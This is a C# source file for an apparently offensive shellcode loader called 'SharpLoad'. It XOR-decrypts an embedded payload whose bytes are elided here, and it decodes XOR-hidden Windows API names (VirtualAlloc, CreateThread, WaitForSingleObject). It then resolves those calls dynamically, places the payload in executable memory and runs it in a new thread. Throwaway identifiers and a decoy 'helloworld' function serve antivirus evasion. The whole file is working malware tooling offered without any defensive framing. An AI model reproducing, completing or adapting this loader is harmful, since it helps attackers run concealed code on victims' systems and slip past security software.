using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace SharpLoad
{
    [ComVisible(true)]
    public class Load
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr aaaaaaaaaaaa(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr bbbbbbbbbbbbb(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate UInt32 ccccccccccccccc(IntPtr hHandle, UInt32 dwMilliseconds);

        public Load()
        {

        }

        public static byte[] helloworld(byte[] e_buf, string key)
        {
            byte[] d_buf = new byte[e_buf.Length];
            byte[] key_bytes = Encoding.UTF8.GetBytes(key);

            for (int i =0; i < e_buf.Length; i++)
            {
                d_buf[i] = (byte)(e_buf[i] ^ key_bytes[i % key_bytes.Length]);
            }

            return d_buf;
        }


        public void Execute()
        {
            Console.WriteLine("Testowy napis");
            
            byte[] buf = new byte[563] {0x8f, ... ,0xb0};


            // Xor payload with one byte key
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            //}



            byte[] d_buf = helloworld(buf, "siemanko");


            byte[] e_dl = { 0x91, 0x9f, 0x88, 0x94, 0x9f, 0x96, 0xc9, 0xc8, 0xd4, 0x9e, 0x96, 0x96 };
            byte[] d_dl = new byte[12];
            for (int i = 0; i < e_dl.Length; i++)
            {
                d_dl[i] = (byte)((uint)e_dl[i] ^ 0xfa);
            }
            var v1 = Encoding.Default.GetString(d_dl);
            string dname2 = v1;

            IntPtr hModule2 = LoadLibrary(dname2);
            byte[] e_va = { 0xac, 0x93, 0x88, 0x8e, 0x8f, 0x9b, 0x96, 0xbb, 0x96, 0x96, 0x95, 0x99 };
            byte[] d_va = new byte[12];
            for (int i = 0; i < e_va.Length; i++)
            {
                d_va[i] = (byte)((uint)e_va[i] ^ 0xfa);
            }
            var v2 = Encoding.Default.GetString(d_va);
            byte[] e_ct = { 0xb9, 0x88, 0x9f, 0x9b, 0x8e, 0x9f, 0xae, 0x92, 0x88, 0x9f, 0x9b, 0x9e };
            byte[] d_ct = new byte[12];
            for (int i = 0; i < e_ct.Length; i++)
            {
                d_ct[i] = (byte)((uint)e_ct[i] ^ 0xfa);
            }
            var v3 = Encoding.Default.GetString(d_ct);
            byte[] e_wf = { 0xad, 0x9b, 0x93, 0x8e, 0xbc, 0x95, 0x88, 0xa9, 0x93, 0x94, 0x9d, 0x96, 0x9f, 0xb5, 0x98, 0x90, 0x9f, 0x99, 0x8e };
            byte[] d_wf = new byte[19];
            for (int i = 0; i < e_wf.Length; i++)
            {
                d_wf[i] = (byte)((uint)e_wf[i] ^ 0xfa);
            }
            var v4 = Encoding.Default.GetString(d_wf);
            IntPtr intPtr2 = GetProcAddress(hModule2, (string)v2);
            aaaaaaaaaaaa va = (aaaaaaaaaaaa)Marshal.GetDelegateForFunctionPointer(intPtr2, typeof(aaaaaaaaaaaa));
            IntPtr addr = va(IntPtr.Zero, 0x7000, 0x3000, 0x40);
            int size = d_buf.Length;
            Marshal.Copy(d_buf, 0, addr, size);
            IntPtr intPtr3 = GetProcAddress(hModule2, (string)v3);
            bbbbbbbbbbbbb cr = (bbbbbbbbbbbbb)Marshal.GetDelegateForFunctionPointer(intPtr3, typeof(bbbbbbbbbbbbb));
            IntPtr hThread = cr(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            IntPtr intPtr4 = GetProcAddress(hModule2, (string)v4);
            ccccccccccccccc wf = (ccccccccccccccc)Marshal.GetDelegateForFunctionPointer(intPtr4, typeof(ccccccccccccccc));
            wf(hThread, 0xFFFFFFFF);
        }

        public static void Main()
        {
            
            Load obiekt = new Load();
            obiekt.Execute();

            string userName = Console.ReadLine();
        }
    }
}
